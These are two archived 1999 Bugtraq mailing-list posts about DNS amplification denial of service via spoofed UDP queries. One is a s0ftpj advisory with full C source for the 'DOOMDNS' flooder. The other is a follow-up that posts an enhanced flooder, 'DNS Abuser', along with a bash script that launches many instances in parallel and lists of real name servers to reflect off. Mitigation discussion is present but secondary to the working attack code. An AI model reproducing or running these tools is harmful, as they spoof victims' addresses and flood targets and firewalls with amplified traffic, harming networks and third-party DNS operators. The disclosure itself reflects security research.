=== Content from marc.info_1abdc461_20250125_123932.html ===

```
[[prev in list](?l=bugtraq&m=93432620700243&w=2)] [[next in list](?l=bugtraq&m=93434048109758&w=2)] [[prev in thread](?l=bugtraq&m=93348057829957&w=2)] [[next in thread](?l=bugtraq&m=93452656308775&w=2)]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [Possible Denial Of Service using DNS](?t=93348059100001&r=1&w=2)
From:       [Carlos Veira <cveira () airtel ! net>](?a=93433786800001&r=1&w=2)
Date:       [1999-08-10 15:59:57](?l=bugtraq&r=1&w=2&b=199908)
[Download RAW [message](?l=bugtraq&m=93433758607623&q=mbox) or [body](?l=bugtraq&m=93433758607623&q=raw)]

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Hi,

I must admit that I have been really surprised seeing people's
'reaction'
on this particular matter. We are used to see really good debates when
something 'c00l' comes up to the scene... But this time, nothing: no
code review, no debate about possible solutions, ... :?.

FuSyS & sacco's message, was very interesting indeed. I, honestly,
don't
know if this has been known for a long time, despite its simplicity...
But what really matters is that this is a very hard to close gate...

Looking at the code i realized it was not very useful for auditing
purposes, so I decided to add some functionality and fix some
implementation problems which made the source compile but failing to
work nicely.

I. Description:
===============

This is a quick list of what has been added/modified to the original
code:

 1. Ability of managing a variable and different number of name
servers
    and querys.
 2. Ability of taking input data from text files.
 3. Added some fixes to the flood engine.
 4. Ability of controlling the times to be executed.
 5. Added some 'paralell processing' features.

There still remain some things to be improved, but they are far long
from
my original aims when I started this work. I might suggest the
following
enhancements:

It's somehow necessary to add some simple memory management. The
current
version works with a buffer which can manage MAX_SEVERS entries. There
are no memory management at all. That means that, when reading a file,
only the first MAX_SERVERS are considered. If we want to extend this
to
larger files this is to be added.

Another improvement would be to enhance the hash function in order to
get a
more uniform statistic distribution. This would carry out a better
'paralell' performance.

This 'paralell' feature trys to query different name servers with
different
questions at the same time. Such a thing would avoid some lame filters
and
make the attack more distributable among the whole DNS servers.

To work out this feature, the flooder begins in a different point
depending
on its PID. Given this situation, one can fork diferent processes from
de
command line and each of them will perform a different action in a
certain
moment. Of course more complex and efficient solutions could be worked
out,
but, once again, they are far long from my initial aims.

As it can be watched, such attack can be as powerful (or even better)
as
smurf or fraggle. Think this is more flexible and owns a grater degree
of
distribution. Let's put some evil imagination in motion... ;P

II. Impact:
===========

First of all, some notes:

  1. We are talking about UDP traffic. That means that there's no
     connection.
  2. We also must consider that the victim will recive packets with
     different
     sources (IPs and ports).
  3. We must remember that DNS is a critical service in the Internet:
     almost every service depend on it in a different degree.
  4. DNS can be reached from any place on the Internet: there is no
     restriction.

Let's consider a couple of scenarios. If the target is not shielded by
a
firewall, the effect of this attack is obvious: the host is flooded to
dead. So, what happend in a filtered environment? If the firewall uses
content inspection techniques, should drop all this traffic (these are
valid answers but no query has been performed on the protected
network).

In this case, the affected host will be the firewall. This is even
more
worrying than the first case because firewalls are esential devices on
network conectivity. If the firewall fails, all the network fails
(from
a conectivity point of view, of course).

We must remember that a firewall is more vulnerable to this kind of
overloads. To the *physical* traffic flooding itself, we have to add
the following :

  a. A firewall must perform a rule check for each I/O traffic. That
means
     some load.
  b. The logging process on the firewall means added load, mainly I/O
load
     through disk.

An encreasing number of DNS servers means a proportional raise on the
distribution degree this attack has. So, to bring a big firewall to
its
knees we only need to take a grate list of DNS servers.

The obvious side effect of such situation is a traffic overload on the
network segments on the way to the target. Using network switches
would
help to limit this annoying side effect.

III. Possible solutions:
========================

a.  Source IP filtering & Bandwith control:
    ---------------------------------------

    a.1 Source IP filtering:

    This may be one the most effective measures. By giving this type
of
    rule to routers, we *limit* the IP spoofing possibilities: such
rule
    would only allow traffic to pass over a network interface if the
    source IP belongs to a valid range on that interface.

    a.2 Bandwith control:

    Giving an I/O rate to DNS traffic could *help* too. This would
stop a
    flood based on a few DNS servers been queried intensively.
    Nevertheless, it is not very useful to the target network when
hitted
    by a highly distributed DNS flood. The reasons are the same ones
given
    in the case of the firewall. In this case the damaged system would
be
    the router itself.

    a.3 Problems:

    Source IP filtering it's great but it needs to be implemented on
every
    routing device on the Internet. If there's a place wich allows IP
    spoofing, the risk remains there.

    Unfortunately, IP filtering could not be necessary on some cases.
Let's
    see: besides the flooding effect, we get a global network
overload. If
    we also consider that today it's pretty common having more than
one PPP
    Internet access... So, we've got it...

    So it seems easy to log into an ISP perform the attack using a
valid
    ISP IP as the source, then disconnect and log in again with other
ISP
    while the other is being nuked by thousands of DNS servers on the
    Internet...

    The success on the choice of the valid ISP IP address depends on
the
    ISP network architecture and its *internal* filters.

b. DNS over TCP:
   -------------

   This may be *THE* solution. TCP architecture would make
'impossible' to
   achieve a successful query to a DNS server. Let's see:

      1. A connection is to be completed in order to perform a query.
      2. There exists connection control.

   On the 'best' case the target would be SYN+ACK flooded by thousands
of
   name servers on the Internet. But now we are not *amplifying* the
   traffic because no query response is given at all.

   But, is this a real possibility? Well reading the RFCs, the answer
is
   "YES, BUT...". Let's see:

   * RFC1034 ("DOMAIN NAMES - CONCEPTS AND FACILITIES") says:

     "In the Internet, queries are carried in UDP datagrams or over
      TCP connections."

   * RFC1035 ("DOMAIN NAMES - IMPLEMENTATION AND SPECIFICATION") says:

     "The DNS assumes that messages will be transmitted as datagrams
or in
      a byte stream carried by a virtual circuit.  While virtual
circuits
      can be used for any DNS activity, datagrams are preferred for
queries
      due to their lower overhead and better performance.  Zone
refresh
      activities must use virtual circuits because of the need for
reliable
      transfer."

   So it seems that DNS querys can use TCP. BUT what we need is the
server
   FORCING the use of TCP. It *seems* we could force this by editing
the
    file "/etc/services" and commenting or deleting the UDP entry:

   whois           43/tcp          nicname         # usually to
sri-nic
   domain          53/tcp
>  #domain          53/udp
   mtp             57/tcp                          # deprecated

   This way, both the *local* name server and *local* resolver would
use
   TCP on its domain name related tasks... This means that *local*
querys
   would work over TCP.

   The problem comes up, when an standard remote client querys a
   'TCP-forced' system. What happens when such a client starts an UDP
   query to a TCP service? Is it able to detect it and restart the
process
   using TCP?

   Unfortunately, I could not found any kind of information on this
matter.
   It seems to me that this is an unspecified case. It seems that UDP
& TCP
   are treated as separete worlds... I think that, in the best case,
this
   will depend on vendor implementation, and not as an standard
behaviour.

   b.1 Problems:

   Carrying DNS completely over TCP has serious load and performance
   problems. They are important enough to consider them with the
suitable
   calm.

   Besides that, we have de UDP/TCP interoperation problem mentioned
   before. This would imply reconfiguring or patching all the DNS
servers
   *and clients* in the world, among other things... So it 'seems'
that it
   is not practical approach. ;P

   Perhaps, It may be interesting a review or a new generation of the
   standard. I, honestly, ignore if this it's being done. Anyway,
given
   what we have today it's *the* long term solution, isn't it? ;P.

   In the meanwhile, we are vulnerable: the open systems world, not
always
   is perfect... ;P

====================
Carlos Veira Lorenzo
     -=o0o0o=-
 Servicios Internet
 Airtel Móvil S.A.
====================
-----BEGIN PGP SIGNATURE-----
Version: PGP 6.0.2

iQA/AwUBN7A+aEj/CaVXSZKlEQKIOACdF74Y7bo4BSrEL6Fw9z+EMwEziSgAnRpu
QlIZlBhOGgaz/TnUFTn/PzHn
=qc06
-----END PGP SIGNATURE-----

[["dnsabuser.c" (application/octet-stream)]](?l=bugtraq&m=93433758607623&q=p3)

/*
 * DNS Abuser v0.4b
 *
 * Author: Nemo (cveira@airtel.net)
 * <http://www.deepzone.org>
 *
 * This code is a little enhancement based on DOOMDNS by FuSyS & |scacco|
 * <http://www.www.s0ftpj.org>
 *
 * Usage: dnsa <target>
 *        dnsa <target> <times> [<dns_servers.txt> <querys.txt>]
 *
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netdb.h>
#include <time.h>

#define  IP_HEAD_BASE		20
#define  UDP_HEAD_BASE		8
#define  DEF_TIMES		1000
#define  DNS_QSIZE		255
#define  MAX_QUERYS		25			// maximum buffer size
#define  MAX_SERVERS		25			// maximum buffer size
#define  CNAME_LENGTH		255			// max CNAME length
#define  DEF_DOMAINS		"./domains.txt"		// domain list file
#define  DEF_QUERYS		"./querys.txt"		// query list file

struct 	 DNS_MSG {
	 HEADER head;
	 char   query[DNS_QSIZE];
};

struct 	 dns_pkt {
	 struct iphdr  ip;
	 struct udphdr udp;
 	 char   data[1000];
};

struct   domain_buff {
	 int  used;
	 char cname[CNAME_LENGTH];
};

typedef  struct domain_buff tdbuff;
tdbuff   dnsquery[MAX_QUERYS];
tdbuff   domains[MAX_SERVERS];
unsigned long saddr;
int      sd, dptr, qptr;				// socket & array pointers
FILE     *dd, *qd;					// file pointers

int startptr(tdbuff *buff, int buff_limit)		// hash function
{
   int init = 0;

   init = getpid() % buff_limit;

   while (!buff[init].used)
   {
      if (++init > buff_limit) init = 0;
   }

   return init;
}

void rst_buff(tdbuff *b, int max)
{
   memset(b, 0, sizeof(tdbuff)*max);
}

void readln(FILE *f, tdbuff *buff)
{
   int eol  = 0,
       i    = 0;
   tdbuff   b;

   rst_buff(&b, 1);

   do
   {
      b.cname[i] = fgetc(f);

      if (!ferror(f))
      {
         if (!feof(f))
         {
            if (b.cname[i] == '\n')
            {
               b.cname[i]  = '\0';
      	       b.used      = 1;
      	       eol             = 1;
            }
            else if ((i+1) >= CNAME_LENGTH)
            {
               fprintf(stderr, "\nInvalid CNAME or invalid file format. Quitting...\n");
               exit(7);
            }
            else
            {
               i++;
            }
         }
         else
         {
            if (b.cname[i] == '\n')
            {
               b.cname[i]  = '\0';
      	       b.used      = 1;
      	    }
         }
      }
      else
      {
         fprintf(stderr, "\nRead error. Quitting...\n");
         exit(6);
      }
   }
   while ((!ferror(f) && !feof(f)) && !eol);

   if (!ferror(f) && !feof(f)) *buff = b;
}

unsigned long nameResolve(char *hostname)
{
  struct in_addr addr;
  struct hostent *hostEnt;

  if ((inet_aton(hostname, &addr)) == 0)
  {
    if (!(hostEnt=gethostbyname(hostname)))
    {
       fprintf(stderr,"\nTarget '%s' does not exist\n",hostname);
       exit(0);
    }
    bcopy(hostEnt->h_name,(char *)&addr.s_addr,hostEnt->h_length);
  }
  return addr.s_addr;
}

void forge (unsigned long daddr, unsigned short psrc, unsigned short pdst)
{
   struct sockaddr_in sin;
   struct dns_pkt     dpk;
   struct DNS_MSG     killer;
   int                shoot, len;

   // adjust pointer ...
   if (qptr < MAX_QUERYS)
   {
      if(!dnsquery[dptr].used) qptr++;
   }
   else
   {
      qptr = 0;
   }
   dnsquery[qptr].used = 1;

   // build packets ...
   memset(&killer, 0, sizeof(killer));

   killer.head.id      = getpid();
   killer.head.rd      = 1;
   killer.head.aa      = 0;
   killer.head.opcode  = QUERY;
   killer.head.qr      = 0;
   killer.head.qdcount = htons(1);
   killer.head.ancount = htons(0);
   killer.head.nscount = htons(0);
   killer.head.arcount = htons(0);

   strcat(killer.query, dnsquery[qptr].cname);
   killer.query[strlen(dnsquery[qptr].cname) + 2] = 0x00FF;
   killer.query[strlen(dnsquery[qptr].cname) + 4] = 0x0001;

   memset(&dpk, 0, sizeof(dpk));

   dpk.udp.source = psrc;
   dpk.udp.dest   = pdst;
   len            = (12 + strlen(killer.query) + 5);
   dpk.udp.len    = htons(UDP_HEAD_BASE + len);

   memcpy(dpk.data, (void*)&killer, len);
   dpk.ip.ihl      = 5;
   dpk.ip.version  = 4;
   dpk.ip.tos      = 0;
   dpk.ip.tot_len  = htons(IP_HEAD_BASE+UDP_HEAD_BASE+len);
   dpk.ip.frag_off = 0;
   dpk.ip.ttl      = 64;
   dpk.ip.protocol = IPPROTO_UDP;
   dpk.ip.saddr    = saddr;
   dpk.ip.daddr    = daddr;

   memset(&sin, 0, sizeof(sin));

   sin.sin_family      = AF_INET;
   sin.sin_port        = pdst;
   sin.sin_addr.s_addr = daddr;

   shoot = sendto(sd                                  ,
                  &dpk                                ,
                  (IP_HEAD_BASE + UDP_HEAD_BASE + len),
                  0                                   ,
                  (struct sockaddr *)&sin             ,
                  sizeof(sin)
                 );

   if (shoot < 0) fprintf(stderr, "SPOOF ERROR");
}

void doomzone (void)
{
   unsigned long  daddr;
   unsigned short psrc, pdest;

   // adjust pointer ...
   if (dptr < MAX_SERVERS)
   {
      if(!domains[dptr].used) dptr++;
   }
   else
   {
      dptr = 0;
   }
   domains[dptr].used = 1;

   daddr = nameResolve(domains[dptr].cname);

   psrc  = htons(1024 + (rand()%2000));
   pdest = htons(53);

   forge(daddr, psrc, pdest);
}

int main (int argc, char *argv[])
{
   int          i, sd_opt, code;
   unsigned int times = DEF_TIMES;

   printf("\n\n\033[1;32mDNS Abuser v0.4b\033[0m");
   printf("\n\033[1;34mDNS-based flooder by Nemo - <http://www.deepzone.org\033>[0m");
   printf("\n\033[1;34mBased on FuSyS & |scacco| work: D00MDNS - <http://www.s0ftpj.org\033>[0m\n");

   // ->simple<- parameter checking :P
   if (argc < 2)
   {
      fprintf(stderr, "\nUsage: %s <target>", argv[[0]](#0));
      fprintf(stderr, "\n       %s <target> <times> [<dns_servers.txt> <querys.txt>]\n\n", argv[[0]](#0));
      exit(0);
   }

   saddr = nameResolve(argv[[1]](#1));
   if (argc > 2) times  = atoi(argv[[2]](#2));

   // loading files
   if (argc > 3)
   {
      if ((dd = fopen(argv[[4]](#4), "r")) == NULL)
      {
         fprintf(stderr, "\nCannot open domain file. Quitting...\n");
         exit(4);
      }

      if ((qd = fopen(argv[[5]](#5), "r")) == NULL)
      {
         fprintf(stderr, "\nCannot open query file. Quitting...\n");
         exit(5);
      }
   }
   else
   {
      if((dd = fopen(DEF_DOMAINS, "r")) == NULL)
      {
         fprintf(stderr, "\nCannot open domain file. Quitting...\n");
         exit(4);
      }

      if((qd = fopen(DEF_QUERYS, "r")) == NULL)
      {
         fprintf(stderr, "\nCannot open query file. Quitting...\n");
         exit(5);
      }
   }

   rst_buff(domains, MAX_SERVERS);
   rst_buff(dnsquery, MAX_QUERYS);

   i = 0;
   do
   {
      readln(dd, &domains[i]);
      i++;
   }
   while ((i < MAX_SERVERS) && !feof(dd));

   i = 0;
   do
   {
      readln(qd, &dnsquery[i]);
      i++;
   }
   while ((i < MAX_QUERYS) && !feof(qd));

   // opening sockets ...
   srand(time(NULL));
   sd_opt = 1;

   if ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
   {
      fprintf(stderr, "\nSocket error. Quitting...\n");
      exit(2);
   }

   if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &sd_opt, sizeof(sd_opt)) < 0)
   {
      fprintf(stderr, "\nIP Error. Quitting...\n");
      exit(3);
   }

   dptr = startptr(domains, MAX_SERVERS);
   qptr = startptr(dnsquery, MAX_QUERYS);

   // flooding engine
   printf("\n\033[1;34mFlooding %s:\033[0m\n", argv[[1]](#1));
   while(times--)
   {
      doomzone();
      printf("\033[1;34m.\033[0m");
   }

   printf("\n\n");

   fclose(dd);
   fclose(qd);

   return(0);
}

[["xn.sh" (application/octet-stream)]](?l=bugtraq&m=93433758607623&q=p4)

#!/bin/bash
#
# xNuke v0.1b - *nix DoS amplifier
#
# Author: Nemo (Nemo@deepzone.org)
# DeepZone Digital Security - <http://www.deepzone.org>
#
# Usage: xn <instances> <app> <target> [other_parameters]
#

echo
echo "xNuke v0.1b - *nix DoS amplifier."
echo

n=$1

while [ -n "$n" ]; do
   $2 $3 $4 $5 $6 > /dev/null &

   n=n-1
done

[["querys.txt" (text/plain)]](?l=bugtraq&m=93433758607623&q=p5)

[www.microsoft.com](http://www.microsoft.com)
[www.novell.com](http://www.novell.com)
[www.nrg.be](http://www.nrg.be)
[www.ldg.be](http://www.ldg.be)
[www.mir.es](http://www.mir.es)
[www.hispasec.com](http://www.hispasec.com)
[www.securityfocus.com](http://www.securityfocus.com)
[www.geocities.com](http://www.geocities.com)
[www.tripod.com](http://www.tripod.com)
[www.hypermart.net](http://www.hypermart.net)
[["domains.txt" (text/plain)]](?l=bugtraq&m=93433758607623&q=p6)

ns1.allinfosys.com
ns2.allinfosys.com
ns.uu.net
dns.ncsa.es
dns2.ncsa.es

[[prev in list](?l=bugtraq&m=93432620700243&w=2)] [[next in list](?l=bugtraq&m=93434048109758&w=2)] [[prev in thread](?l=bugtraq&m=93348057829957&w=2)] [[next in thread](?l=bugtraq&m=93452656308775&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from marc.info_d3038cdb_20250125_123931.html ===

```
[[prev in list](?l=bugtraq&m=93347785827287&w=2)] [[next in list](?l=bugtraq&m=93347317325247&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=93433758607623&w=2)]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [Possible Denial Of Service using DNS](?t=93348059100001&r=1&w=2)
From:       [smaster () sail ! it](?a=93347806700001&r=1&w=2)
Date:       [1999-07-30 22:00:10](?l=bugtraq&r=1&w=2&b=199907)
[Download RAW [message](?l=bugtraq&m=93348057829957&q=mbox) or [body](?l=bugtraq&m=93348057829957&q=raw)]

SPJ-002-000:

                   .::::::::+[ s0ftpr0ject 99 ]+::::::::.
                   ::::+[ Digital Security for Y2K ]+::::
                   :::'"""`"'"""`"'"""`"'"""`"'"`"'""`:::
                   ::'.g#S$"$S#n. .g#S$"$S#n.     S#n.`::
                   :: $$$$$ $$$$$ $$$$$ $$$$$     $$$$ ::
                   :: $$$$$       $$$$$ $$$$$     $$$$ ::
                   :: `$$$$$$$$$n $$$$$ $$$$$     $$$$ ::
                   ::       $$$$$ $$$$$s$$$$'     $$$$ ::
                   :: $$$$$ $$$$$ $$$$$     $$$$$ $$$$ ::
                   :: `$$$$s$$$S' `$$$$     `$$$$s$$S' ::
                   :::...........:.....:::::..........:::
                   :::+[ Security Advisory, 002-000 ]+:::
                   `::::::::+[ July 19, 1999 ]+:::::::::'

                    Possible Denial Of Service using DNS

                      by |scacco| <scacco@s0ftpj.org>

---[ Systems affected ]-------------------------------------------------------

All systems running Bind (All versions seems affected).

---[ Condition of discovery ]-------------------------------------------------

This misfeature was discovered configuring bind on a Red Hat 5.2 system
shipped with the original cdrom, allowing udp dns requests and without
access lists.

---[ Detailed description ]---------------------------------------------------

All domain name systems resides on port 53 formely called domain. Looking at
rfc and in particular at RedHat system defaults seems that port 53 is enabled
to support udp and tcp requests as specified in /etc/services file:

domain          53/tcp
domain          53/udp

It's possible to flood someone sending spoofed UDP QUERY to the DNS,
because UDP doesn't provide a fruitful authentication process.
Why use DNS QUERY? Simple. We just want to make sure we've got a real advantage
against our nice target so we look for a good I/O ratio. With just a few bytes
(20-30) we can achieve responses of around 400-500 bytes. So we usually
achieve a 20x ratio. Furthemore, every DNS reply will eligit ICMP unreach
packets from the target since no UDP port will be open to accept data.
A modem user compared with large RR of type * (0xFF) will be flooded.					  *

---[ Exploitation ]-----------------------------------------------------------

/******************************************************************
*								  *
* DOOMDNS	Yet another flooder with 1:x pkts ratio. This one *
*		exploits DNS simple QUERY with spoofed UDPs.	  *
*		Since almost every DNS is bound to answer queries *
*		from the void, and since UDP doesn't provide a	  *
* 		fruitful authentication process cause plain TCP   *
*		does, uh !? ;) here we are.	  		  *
*								  *
*			       hints by |scacco|, code by FuSyS   *
*			       <http://www.s0ftpj.org>              *
*								  *
******************************************************************/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netdb.h>
#include <time.h>

#define IP_HEAD_BASE		20
#define UDP_HEAD_BASE		8

unsigned long saddr;
int sfd, loop;
char *dns_def[]={/* LISTA ASSENTE */ ,NULL};
char *domains[]={/* LISTA ASSENTE */ ,NULL};

struct DNS_MSG {
	HEADER head;
	char query[255];
};

struct dns_pkt {
	struct iphdr ip;
	struct udphdr udp;
	char data[1000];
};

unsigned long nameResolve(char *hostname)
{
  struct in_addr addr;
  struct hostent *hostEnt;

  if((addr.s_addr=inet_addr(hostname)) == -1)
  {
    if(!(hostEnt=gethostbyname(hostname)))
    {
        fprintf(stderr,"N0 SUCH H0ST:`%s`\n",hostname);
        exit(0);
    }
    bcopy(hostEnt->h_addr,(char *)&addr.s_addr,hostEnt->h_length);
  }
  return addr.s_addr;
}

void forge (unsigned long daddr, unsigned short src, unsigned short dst)
{
	struct sockaddr_in sin;
	struct dns_pkt dpk;
	struct DNS_MSG killer;
        int shoot, len;

	memset(&killer, 0, sizeof(killer));
	killer.head.id=getpid();
	killer.head.rd=1;
	killer.head.aa=0;
	killer.head.opcode=QUERY;
	killer.head.qr=0;
	killer.head.qdcount=htons(1);
	killer.head.ancount=htons(0);
	killer.head.nscount=htons(0);
	killer.head.arcount=htons(0);
	strcat(killer.query, domains[--loop]);
	killer.query[strlen(domains[loop])+2]=0x00FF;
	killer.query[strlen(domains[loop])+4]=0x0001;

	memset(&dpk, 0, sizeof(dpk));

	dpk.udp.source=src;
	dpk.udp.dest=dst;
	len=(12+strlen(killer.query)+5);
	dpk.udp.len=htons(UDP_HEAD_BASE+len);
	memcpy(dpk.data, (void*)&killer, len);

	dpk.ip.ihl=5;
        dpk.ip.version=4;
        dpk.ip.tos=0;
	dpk.ip.tot_len=htons(IP_HEAD_BASE+UDP_HEAD_BASE+len);
	dpk.ip.frag_off=0;
	dpk.ip.ttl=64;
	dpk.ip.protocol=IPPROTO_UDP;
	dpk.ip.saddr=saddr;
	dpk.ip.daddr=daddr;

	memset(&sin, 0, sizeof(sin));
        sin.sin_family=AF_INET;
        sin.sin_port=dst;
        sin.sin_addr.s_addr=daddr;

	shoot=sendto(sfd, &dpk,IP_HEAD_BASE+UDP_HEAD_BASE+len,
                0, (struct sockaddr *)&sin, sizeof(sin));
	if(shoot<0)fprintf(stderr, "SPOOF ERROR");
	loop++;
}

void doomzone (void)
{
	unsigned long daddr;
	unsigned short source, dest;

	if(dns_def[loop]==NULL) loop=0;
	daddr=nameResolve(dns_def[loop++]);
	source=htons(1024+(rand()%2000));
	dest=htons(53);
	forge(daddr, source, dest);
}

int main (int argc, char **argv)
{
        int sfdo;
        unsigned int hz=100;

	if(argc<2) {
		fprintf(stderr, "Interesting .... let's flood ourselves ?!\n");
		fprintf(stderr, "Use: %s target [n]\n", argv[[0]](#0));
		exit(0);
	}

	if(argv[[2]](#2)) hz=atoi(argv[[2]](#2));
	saddr=nameResolve(argv[[1]](#1));

	srand(time(NULL));

	if((sfd=socket(AF_INET, SOCK_RAW, IPPROTO_RAW))<0) {
                fprintf(stderr, "\nSOCK_RAW Died\n");
                exit(2);
        }
        sfdo=1;
        if(setsockopt(sfd, IPPROTO_IP, IP_HDRINCL, &sfdo, sizeof(sfdo))<0) {
                fprintf(stderr, "\nIP_HDRINCL Died\n");
                exit(3);
        }

	printf("\n\033[1;32mD00M DNS\033[0m");
        printf("\n\033[1;34mDNS Flooder by FuSyS\033[0m");
        printf("\n\033[1;34minithints by |scacco|\033[0m\n\n");

	loop=0;
	while(hz--) {
		doomzone();
		printf("\033[1;34m.\033[0m");
	}
	printf("\n\n");
	return(0);
}

---[Possible fixes ]----------------------------------------------------------

Seems hard to fix this hole due to dns protocol specification, it could be
possible to setup access lists or some sort of packet sanity check, for this
we want suggest you to keep in contact with ISC staff to get a more efficent
solution for this problem.

---[ URLs and references ]----------------------------------------------------

Internet Software Consurtium can be found at <http://www.isc.org>.
This is also the home of bind.

---[ Contact informations ]---------------------------------------------------

s0ftpr0ject 99 - Digital security for Y2K (s0ftpj)
no-profit security research

Internet site: <http://www.s0ftpj.org>
E-mail       : staff@s0ftpj.org

All advisories and security documents are available via http at:

<http://www.s0ftpj.org> (195.32.69.44) courtesy of Metro Olografix
<http://www.olografix.org> (195.32.69.44)

This document has no copyright, feel free to distribute it without any
limitation. Original copy of this document can be found at out Internet site
for free. You are not allowed to modify this paper without prior notify to
s0ftpr0ject staff at staff@s0ftpj.org.

---[ s0ftpr0ject 99 staff Public PGP Key ]------------------------------------

Type Bits/KeyID    Date       User ID
pub  2600/15A01BB9 1999/07/22 S0ftPj Staff <staff@s0ftpj.org>

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: 2.6.3i

mQFSAzeXNL8AAAEKKNzvok6FkB24mQUEx5Q4SZ97dQlmx3yNeEvG7aJ/0TDKWWUv
f6a+t1jF8V7JMhV1JxU/z38MgTYRGt6dspWlTLKb543GxBRqOdMohigBu8rUmDEb
UlD9gAav5M+OSY6oNh5a7e/YrPLhOiqxNxBIXQCDgKtIUv9NF8KbcbS96EAmNsuH
UA/hJ2Arlx2wSkmJZgvcpiM6O/1g1OYgg7Gur39SqsNZn0RUKxi463qASGfJT4sa
rpH6clBsVpNei5bf/4Bke5/8dnJL5DzM0twxTUmvdq1Pt1+6sRCd70IsqXPvjZu2
Drx4rzlLItD84xmE9w/vGdLMtPSTPwX7ak2TvhWqBOkqzWJNiRjzi+T6HiNfuqUr
sr90FndiRNJcWCbmPs2TJISLePsi9AVGL5KFfmimdSJPagzWG1FVQhyo2HS4nRWg
G7kABRG0H1MwZnRQaiBTdGFmZiA8c3RhZmZAczBmdHBqLm9yZz6JAVoDBRA3lzS/
2HS4nRWgG7kBAaYiCiQPM05Pr5FkSgjHkVUbgyxwuWkp9MDOxhvFAgcsHJUX2h6V
F02vzDMR2BOvaRhkm43IwXxK490Tp86pbbhC28SiF3TEyHjmu8tMrXo/cX69fcqy
IbvVgHKEIUYR8Sik7mLX9HqUh9qh7e6o4cH5TsCCJxIoqf2Qt4t5HA4m77H1niNP
EqY2HGzvQUPfvTf+KffdLGoAa/NSKJyB8stlWIJ4SAe7EkGscSjcDFvrm25pDT33
JHyBHBdmUY0Kr+gzmg9CuUZUhVtdun0mwZJLicOSUFQeYuPsid+ayggdgfGR7spM
NymPkS2MF8jGOKCa9EqWbn5gBP0uZm5aMrg6+O+s+xNonK0BcFH7iIUAsL9qUHLD
4edFudwxa6XW7LuJoqDVlUzhqA3Ru5Yd8eTD7vbcjR3fRngDpLDu8UhC0MFQSoDW
IWKJ
=i4i0
-----END PGP PUBLIC KEY BLOCK-----

[[prev in list](?l=bugtraq&m=93347785827287&w=2)] [[next in list](?l=bugtraq&m=93347317325247&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=93433758607623&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


